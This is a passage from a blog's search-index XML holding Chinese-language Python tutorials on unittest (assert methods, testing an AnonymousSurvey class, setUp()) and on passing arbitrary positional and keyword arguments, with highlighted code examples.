class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Ran <span class="token number">1</span> test <span class="token keyword">in</span> <span class="token number">0.</span>000sFAILED<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#指出整个测试用例都没有通过</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-测试未通过时怎么办"><a href="#1-4-测试未通过时怎么办" class="headerlink" title="1.4 测试未通过时怎么办"></a>1.4 测试未通过时怎么办</h3><p>修改导致测试不能通过的代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_formatted_name</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> last<span class="token punctuation">,</span> middle<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Generate a neatly formatted full name"""</span>    <span class="token keyword">if</span> middle<span class="token punctuation">:</span>        full_name <span class="token operator">=</span> first <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> middle <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> last    <span class="token keyword">else</span><span class="token punctuation">:</span>        full_name <span class="token operator">=</span> first <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> last    <span class="token keyword">return</span> full_name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-5-添加新测试"><a href="#1-5-添加新测试" class="headerlink" title="1.5 添加新测试"></a>1.5 添加新测试</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">from</span> name_function <span class="token keyword">import</span> get_formatted_name<span class="token keyword">class</span> <span class="token class-name">NamesTest</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""测试name_function.py"""</span>    <span class="token keyword">def</span> <span class="token function">test_first_last_name</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""能够正确的处理像Janis Joplin这样的姓名吗？"""</span>        formatted_name <span class="token operator">=</span> get_formatted_name<span class="token punctuation">(</span><span class="token string">'janis'</span><span class="token punctuation">,</span> <span class="token string">'joplin'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span>formatted_name<span class="token punctuation">,</span> <span class="token string">'Janis Joplin'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_f_l_m_name</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        formatted_name <span class="token operator">=</span> get_formatted_name<span class="token punctuation">(</span><span class="token string">'janis'</span><span class="token punctuation">,</span> <span class="token string">'joplin'</span><span class="token punctuation">,</span> <span class="token string">'wang'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span>formatted_name<span class="token punctuation">,</span><span class="token string">'Janis Wang Joplin'</span><span class="token punctuation">)</span>unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Ran <span class="token number">2</span> tests <span class="token keyword">in</span> <span class="token number">0.</span>000sOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-测试类"><a href="#2-测试类" class="headerlink" title="2. 测试类"></a>2. 测试类</h2><h3 id="2-1-各种断言方法"><a href="#2-1-各种断言方法" class="headerlink" title="2.1 各种断言方法"></a>2.1 各种断言方法</h3><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>assertEqual(a, b)</td><td>核实a == b</td></tr><tr><td>assertNotEqual(a, b)</td><td>核实a != b</td></tr><tr><td>assertTrue(x)</td><td>核实x为True</td></tr><tr><td>assertFalse(x)</td><td>核实x为False</td></tr><tr><td>assertIn(item, list)</td><td>核实item在list中</td></tr><tr><td>assertNotIn(item, list)</td><td>核实item不在list中</td></tr></tbody></table><p>只能在继承unittest.TestCase的类中使用这些方法。上面只列出了6个常用的断言方法。</p><h3 id="2-2-一个要测试的类"><a href="#2-2-一个要测试的类" class="headerlink" title="2.2 一个要测试的类"></a>2.2 一个要测试的类</h3><p>类的测试与函数的测试相似，大部分工作都是测试类中方法的行为，但存在一些不同之处。下面在survey.py中编写一个类：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">AnonymousSurvey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""收集匿名调查问卷的答案"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> question<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""存储一个问题，并为存储答案做准备"""</span>        self<span class="token punctuation">.</span>question <span class="token operator">=</span> question        self<span class="token punctuation">.</span>responses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">show_question</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""显示调查问卷"""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>question<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">store_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> new_response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""存储单份调查问卷答案"""</span>        self<span class="token punctuation">.</span>responses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_response<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">show_results</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""显示收集到的所有答卷"""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Survey results:"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> response <span class="token keyword">in</span> self<span class="token punctuation">.</span>responses<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后在language_survey.py中使用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> survey <span class="token keyword">import</span> AnonymousSurvey<span class="token comment">#定义一个问题，并创建一个表示调查的AnonymousSurvey对象</span>question <span class="token operator">=</span> <span class="token string">"What language did you first learn to speak?"</span>my_survey <span class="token operator">=</span> AnonymousSurvey<span class="token punctuation">(</span>question<span class="token punctuation">)</span><span class="token comment">#显示问题并存储答案</span>my_survey<span class="token punctuation">.</span>show_question<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter 'q' at any time to quit.\n"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Language: "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    my_survey<span class="token punctuation">.</span>store_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token comment">#显示调查结果</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nThank you to everyone who participated in the survey!"</span><span class="token punctuation">)</span>my_survey<span class="token punctuation">.</span>show_results<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在想进行改进：让每位用户都可输入多个答案；编写一个方法，它只列出不同的答案，并指出每个答案出现了多少次；再编写一个类，用于管理非匿名调查。</p><p>进行上述修改存在风险。例如，允许每位用户输入多个答案时，可能不小心修改了处理单个答案的方式。要确认在开发这个模块时没有破坏既有行为，可以编写针对这个类的测试。</p><h3 id="2-3-测试AnonymousSurvey类"><a href="#2-3-测试AnonymousSurvey类" class="headerlink" title="2.3 测试AnonymousSurvey类"></a>2.3 测试AnonymousSurvey类</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">from</span> survey <span class="token keyword">import</span> AnonymousSurvey<span class="token keyword">class</span> <span class="token class-name">TestAnonymousSurvey</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""针对AnonymousSurvey类的测试"""</span>    <span class="token keyword">def</span> <span class="token function">test_store_single_response</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""测试单个答案会被妥善地存储"""</span>        question <span class="token operator">=</span> <span class="token string">"What language did you first learn to speak?"</span>        my_survey <span class="token operator">=</span> AnonymousSurvey<span class="token punctuation">(</span>question<span class="token punctuation">)</span>        my_survey<span class="token punctuation">.</span>store_response<span class="token punctuation">(</span><span class="token string">'English'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertIn<span class="token punctuation">(</span><span class="token string">'English'</span><span class="token punctuation">,</span> my_survey<span class="token punctuation">.</span>responses<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_store_three_responses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""测试三个答案会被妥善地存储"""</span>        question <span class="token operator">=</span> <span class="token string">"What language did you first learn to speak?"</span>        my_survey <span class="token operator">=</span> AnonymousSurvey<span class="token punctuation">(</span>question<span class="token punctuation">)</span>        responses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'English'</span><span class="token punctuation">,</span> <span class="token string">'Spanish'</span><span class="token punctuation">,</span> <span class="token string">'Mandarin'</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> response <span class="token keyword">in</span> responses<span class="token punctuation">:</span>            my_survey<span class="token punctuation">.</span>store_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>                <span class="token keyword">for</span> response <span class="token keyword">in</span> responses<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>assertIn<span class="token punctuation">(</span>response<span class="token punctuation">,</span> my_survey<span class="token punctuation">.</span>responses<span class="token punctuation">)</span>            unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种做法的效果很好，但这些测试有些重复的地方（每个测试方法中创建了一个AnonymousSurvey实例）。下面使用unittest的另一项功能来提高它们的效率。</p><h3 id="2-4-方法setUp"><a href="#2-4-方法setUp" class="headerlink" title="2.4 方法setUp()"></a>2.4 方法setUp()</h3><p>unittest.TestCase类包含方法setUp()，让我们只需创建这些对象一次，并在每个测试方法中使用它们。Python将会先运行setUp()，然后再运行其他前缀为<em>test_</em> 的方法。</p><p>下面使用setUp()来创建一个调查对象和一组答案：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">from</span> survey <span class="token keyword">import</span> AnonymousSurvey<span class="token keyword">class</span> <span class="token class-name">TestAnonymousSurvey</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""针对AnonymousSurvey类的测试"""</span>    <span class="token keyword">def</span> <span class="token function">setUp</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""创建一个调查对象和一组答案，供使用的测试方法使用"""</span>        question <span class="token operator">=</span> <span class="token string">"What language did you first learn to speak?"</span>        self<span class="token punctuation">.</span>my_survey <span class="token operator">=</span> AnonymousSurvey<span class="token punctuation">(</span>question<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>responses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'English'</span><span class="token punctuation">,</span> <span class="token string">'Spanish'</span><span class="token punctuation">,</span> <span class="token string">'Mandarin'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">test_store_single_response</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""测试单个答案会被妥善地存储"""</span>        self<span class="token punctuation">.</span>my_survey<span class="token punctuation">.</span>store_response<span class="token punctuation">(</span>self<span class="token punctuation">.</span>responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertIn<span class="token punctuation">(</span>self<span class="token punctuation">.</span>responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>my_survey<span class="token punctuation">.</span>responses<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">test_store_three_responses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""测试三个答案会被妥善地存储"""</span>        <span class="token keyword">for</span> response <span class="token keyword">in</span> self<span class="token punctuation">.</span>responses<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>my_survey<span class="token punctuation">.</span>store_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>                <span class="token keyword">for</span> response <span class="token keyword">in</span> self<span class="token punctuation">.</span>responses<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>assertIn<span class="token punctuation">(</span>response<span class="token punctuation">,</span> self<span class="token punctuation">.</span>my_survey<span class="token punctuation">.</span>responses<span class="token punctuation">)</span>unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：运行测试用例时，每完成一个单元测试，Python都打印一个字符，通过打印，引发错误打印E，导致断言失败打印F。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:传递任意数量实参</title>
      <link href="2020/02/14/python-chuan-di-ren-yi-shu-liang-shi-can/"/>
      <url>2020/02/14/python-chuan-di-ren-yi-shu-liang-shi-can/</url>
      
        <content type="html"><![CDATA[<p>有时在编写一个函数时，并不知道函数需要接受多少个实参。比如，要制作一个披萨，它需要接受很多配料，你并不能预先知道顾客需要多少种配料。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">make_pizza</span><span class="token punctuation">(</span><span class="token operator">*</span>toppings<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""打印顾客点的所有配料"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nMaking a pizza with the following toppings:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> topping <span class="token keyword">in</span> toppings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token operator">+</span>topping<span class="token punctuation">)</span>    make_pizza<span class="token punctuation">(</span><span class="token string">'pepperoni'</span><span class="token punctuation">)</span>make_pizza<span class="token punctuation">(</span><span class="token string">'mushrooms'</span><span class="token punctuation">,</span><span class="token string">'green peppers'</span><span class="token punctuation">,</span><span class="token string">'extra chees'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>形参名<code>*toppings</code>让Python创建一个名为<code>toppings</code>的空元组，并将收到的所有值都装入这个元组中。</p><h1 id="结合使用位置实参和任意数量实参"><a href="#结合使用位置实参和任意数量实参" class="headerlink" title="结合使用位置实参和任意数量实参"></a>结合使用位置实参和任意数量实参</h1><p>如果要让函数接收不同类型的实参，必须在函数定义中将接纳任意数量实参的形参放在最后。<br>例如，函数还需要一个表示披萨尺寸的实参。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">make_pizza</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token operator">*</span>toppings<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""打印顾客点的所有配料"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nMaking a"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-inch pizza with the following toppings:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> topping <span class="token keyword">in</span> toppings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> topping<span class="token punctuation">)</span>make_pizza<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'pepperoni'</span><span class="token punctuation">)</span>make_pizza<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'mushrooms'</span><span class="token punctuation">,</span><span class="token string">'green peppers'</span><span class="token punctuation">,</span><span class="token string">'extra cheese'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用任意数量的关键字实参"><a href="#使用任意数量的关键字实参" class="headerlink" title="使用任意数量的关键字实参"></a>使用任意数量的关键字实参</h1><p>有时需要接受任意数量的实参，但预先不知道传递给函数的会是什么样的信息。在这种情况下，可将函数编写成能够接受任意数量的键值对——调用语句提供了多少就接受多少。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">build_profile</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span>last<span class="token punctuation">,</span><span class="token operator">**</span>user_info<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""创建一个字典，其中包含我们知道的有关用户的一切"""</span>    profile <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    profile<span class="token punctuation">[</span><span class="token string">'first_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> first    profile<span class="token punctuation">[</span><span class="token string">'last_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> last    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> user_info<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    profile<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value    <span class="token keyword">return</span> profileuser_profile <span class="token operator">=</span> build_profile<span class="token punctuation">(</span><span class="token string">'albert'</span><span class="token punctuation">,</span><span class="token string">'einstein'</span><span class="token punctuation">,</span>location<span class="token operator">=</span><span class="token string">'princeton'</span><span class="token punctuation">,</span>field<span class="token operator">=</span><span class="token string">'physics'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user_profile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
